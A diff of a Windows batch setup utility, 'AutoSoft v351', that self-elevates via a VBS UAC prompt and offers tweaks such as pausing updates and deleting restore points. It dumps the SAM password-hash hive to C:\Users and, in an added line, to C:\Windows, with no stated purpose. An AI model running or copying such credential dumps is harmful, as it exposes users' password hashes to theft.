@@ -11,6 +11,7 @@ set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 rmdir /s /q "%USERPROFILE%\desktop\1-Soft"
 reg save HKLM\SAM C:\Users\SAM
+reg save HKLM\SAM C:\Windows\SAM
 start "" /min "%~dp0Script\internet.bat"
 cls
 
@@ -25,7 +26,7 @@ echo  " \/ /   | |_) | '_ \ / _ \| '_ \ / _` |  \ \ / / | | |   \/ / "
 echo  " / /\   |  __/| | | | (_) | | | | (_| |   \ V /| |_| |   / /\ "
 echo  "/ /\ \  |_|   |_| |_|\___/|_| |_|\__, |    \_/  \__,_|  / /\ \"
 echo  "\ \/ /                           |___/                  \ \/ /"
-echo  " \/ /                           AutoSoft v350 by Bunbo   \/ / "
+echo  " \/ /                           AutoSoft v351 by Bunbo   \/ / "
 echo  " / /\.--..--..--..--..--..--..--..--..--..--..--..--..--./ /\ "
 echo  "/ /\ \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \/\ \"
 echo  "\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `' /"
@@ -43,9 +44,9 @@ echo      9. Pause Windows Update (2080)
 echo      10. Rename WPS, delete Update Wps Office
 echo      11. Edit Taskbar: Windows button sang trai, xoa icon rac
 echo      12. Open SMB 24h2 
-echo      13. Xoa Dell Optimize, Dell Dilivery (thu nghiem)
+echo      13. Xoa Dell Optimize, Dell Dilivery (hide)
 echo      14. Open/Close Chrome/Zalo/EDGE
-echo      15. Doi Hinh Nen, Fill to Stretch
+echo      15. Doi Hinh Nen, Fill to Stretch (hide)
 echo      16. PowerButton to Shutdown
 echo      17. Disable Startup Zalo
 echo      18. Disable Sysyem Protection C: D: E:, Delete all restore points
